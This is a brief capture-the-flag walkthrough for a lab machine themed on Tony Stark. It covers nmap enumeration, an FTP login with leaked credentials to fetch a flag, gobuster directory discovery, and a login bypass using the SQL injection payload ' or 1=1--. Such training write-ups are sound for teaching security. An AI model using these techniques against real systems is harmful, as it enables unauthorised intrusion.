# Avenger's Blog

Learn to hack into Tony Stark's machine! You will enumerate the machine, bypass a login portal via SQL injection and gain root access by command injection.  

## Technoloiges

- nmap  
- ftp
- wget
- gobuster  

## Cookies

![Cookie](/assets/avenger-blog-101.png)  

![Flag1](/assets/avenger-blog-102.png)  

## HTTP Headers

![Flag2](/assets/avenger-blog-103.png)  

## Enumeration and FTP

```md
:> nmap <Target IP> -v

Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-09 00:24 GMT
Initiating Ping Scan at 00:24
Scanning 10.64.191.189 [4 ports]
Completed Ping Scan at 00:24, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:24
Scanning 10.64.191.189 [1000 ports]
Discovered open port 21/tcp on 10.64.191.189
Discovered open port 80/tcp on 10.64.191.189
Discovered open port 22/tcp on 10.64.191.189
Completed SYN Stealth Scan at 00:24, 0.06s elapsed (1000 total ports)
Nmap scan report for 10.64.191.189
Host is up (0.00051s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Entry from blog indicates potential password  

![Leak](/assets/avenger-blog-104.png)  

`:> ftp <Target IP>`  

![Success](/assets/avenger-blog-105.png)  

Identify the flag by moving through directories with standard linux commands  

![Find the Flag](/assets/avenger-blog-106.png)  

From the attacking machine, use wget to download the flag  

`:> ftp://groot:iamgroot@10.64.191.189/files/flag3.txt`  

![wget](/assets/avenger-blog-107.png)  

`:> cat  10.64.191.189/files/flag3.txt` to get the flag  

![flag3.txt](/assets/avenger-blog-108.png)  

## Gobuster

Web directory discovery  

`:> gobuster dir -u <Target URL> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt`  

![directories](/assets/avenger-blog-109.png)  

Only three directories returned the "200" value. One of those has a login page.  

![portal](/assets/avenger-blog-110.png)  

## SQL Injection

set both admin and password fields to `' or 1=1--` for successful login  

View the page source to identify the number of lines of code  

## Remote code Execution and Linux

less ../flag5.txt  